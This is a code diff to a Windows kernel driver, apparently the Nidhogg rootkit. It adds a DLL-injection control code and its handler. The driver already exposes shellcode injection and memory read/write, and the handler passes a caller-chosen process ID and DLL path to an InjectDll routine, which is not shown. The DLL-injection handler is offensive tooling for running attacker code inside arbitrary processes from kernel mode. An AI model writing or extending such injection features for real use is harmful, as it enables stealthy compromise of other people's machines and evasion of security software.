@@ -30,6 +30,7 @@
 #define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x816, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x817, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
 
 /*
@@ -1023,7 +1024,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_NIDHOGG_INJECT_SHELLCODE: 
 	{
-		if (!Features.Injection) {
+		if (!Features.ApcInjection) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, shellcode injection feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
 			break;
@@ -1048,6 +1049,36 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 
 		KdPrint((DRIVER_PREFIX "Shellcode injected successfully.\n"));
+		break;
+	}
+
+	case IOCTL_NIDHOGG_INJECT_DLL:
+	{
+		if (!Features.ApcInjection) {
+			KdPrint((DRIVER_PREFIX "Due to previous error, dll injection feature is unavaliable.\n"));
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		if (size % sizeof(DllInformation) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (DllInformation*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID || !data->DllPath) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (!NT_SUCCESS(InjectDll(data))) {
+			KdPrint((DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status));
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "DLL injected successfully.\n"));
 		break;
 	}
 
